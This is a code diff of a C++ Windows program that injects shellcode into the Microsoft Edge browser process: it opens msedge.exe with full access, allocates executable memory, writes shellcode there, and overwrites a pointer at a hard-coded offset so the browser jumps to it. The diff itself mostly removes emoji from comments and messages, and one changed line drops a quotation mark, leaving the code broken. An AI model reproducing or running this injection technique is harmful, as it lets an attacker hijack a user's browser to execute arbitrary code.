@@ -3,8 +3,8 @@
 #include <iostream>
 #include <vector>
 #include <psapi.h>
-#include <cstdint>     // ✅ Needed for uint64_t
-#include <cstring>     // ✅ Needed for _stricmp
+#include <cstdint>     //  Needed for uint64_t
+#include <cstring>     // Needed for _stricmp
 
 #define TARGET_PROCESS_NAME "msedge.exe"
 #define DQ_OFFSET 0x30E998
@@ -74,7 +74,7 @@ DWORD FindProcessId(const char* processName) {
     return pid;
 }
 
-// 📦 Get base address of target module
+//  Get base address of target module
 uintptr_t GetModuleBaseAddress(DWORD pid, const char* moduleName) {
     uintptr_t baseAddress = 0;
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
@@ -101,70 +101,70 @@ int main() {
     // Step 1: 🔎 Get PID
     DWORD pid = FindProcessId(TARGET_PROCESS_NAME);
     if (!pid) {
-        std::cerr << "❌ msedge.exe not found.\n";
+        std::cerr << " msedge.exe not found.\n";
         return 1;
     }
     std::cout << "🧬 PID of msedge.exe: " << pid << "\n";
 
-    // Step 2: 📍 Get base address of msedge.exe
+    // Step 2: Get base address of msedge.exe
     uintptr_t baseAddress = GetModuleBaseAddress(pid, TARGET_PROCESS_NAME);
     if (!baseAddress) {
-        std::cerr << "❌ Failed to get base address.\n";
+        std::cerr << "Failed to get base address.\n";
         return 2;
     }
     std::cout << "🏠 Base address of msedge.exe: 0x" << std::hex << baseAddress << "\n";
     uintptr_t JmpAddress = baseAddress + Jmpoffset;
     std::cout << "Jmp Address   : 0x" << std::hex << JmpAddress << std::endl;
 
-    // Step 3: ✍️ Calculate target dq address
+    // Step 3: Calculate target dq address
     LPVOID patchAddr = (LPVOID)(baseAddress + DQ_OFFSET);
-    std::cout << "🎯 DQ address to patch: 0x" << std::hex << (uintptr_t)patchAddr << "\n";
+    std::cout <<  DQ address to patch: 0x" << std::hex << (uintptr_t)patchAddr << "\n";
 
-    // Step 4: 🧠 Open process
+    // Step 4: Open process
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProc) {
-        std::cerr << "❌ Failed to open process.\n";
+        std::cerr << "Failed to open process.\n";
         return 3;
     }
 
     // Step 5: 💾 Allocate memory for shellcode
     LPVOID remoteShellcode = VirtualAllocEx(hProc, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteShellcode) {
-        std::cerr << "❌ Failed to allocate memory.\n";
+        std::cerr << " Failed to allocate memory.\n";
         CloseHandle(hProc);
         return 4;
     }
-    std::cout << "🧠 Allocated shellcode memory at: 0x" << std::hex << (uintptr_t)remoteShellcode << "\n";
+    std::cout << " Allocated shellcode memory at: 0x" << std::hex << (uintptr_t)remoteShellcode << "\n";
 
     // Step 6: 🚀 Write shellcode
     if (!WriteProcessMemory(hProc, remoteShellcode, shellcode.data(), shellcode.size(), nullptr)) {
-        std::cerr << "❌ Failed to write shellcode.\n";
+        std::cerr << " Failed to write shellcode.\n";
         VirtualFreeEx(hProc, remoteShellcode, 0, MEM_RELEASE);
         CloseHandle(hProc);
         return 5;
     }
 
-    // Step 7: 🔓 Change memory protection of dq
+    // Step 7: Change memory protection of dq
     DWORD oldProtect;
     if (!VirtualProtectEx(hProc, patchAddr, sizeof(uint64_t), PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        std::cerr << "❌ Failed to change memory protection.\n";
+        std::cerr << " Failed to change memory protection.\n";
         CloseHandle(hProc);
         return 6;
     }
 
-    // Step 8: 🩹 Patch dq with shellcode address
+    // Step 8: Patch dq with shellcode address
     uint64_t shellcodeAddr = (uint64_t)remoteShellcode;
     if (!WriteProcessMemory(hProc, patchAddr, &shellcodeAddr, sizeof(shellcodeAddr), nullptr)) {
-        std::cerr << "❌ Failed to patch dq.\n";
+        std::cerr << " Failed to patch dq.\n";
         VirtualProtectEx(hProc, patchAddr, sizeof(shellcodeAddr), oldProtect, &oldProtect);
         CloseHandle(hProc);
         return 7;
     }
 
-    // Step 9: 🔒 Restore protection
+    // Step 9:  Restore protection
     VirtualProtectEx(hProc, patchAddr, sizeof(shellcodeAddr), oldProtect, &oldProtect);
 
-    std::cout << "✅ Successfully patched dq to point to shellcode.\n";
+    std::cout << "Successfully patched dq to point to shellcode.\n";
 
     CloseHandle(hProc);
     return 0;
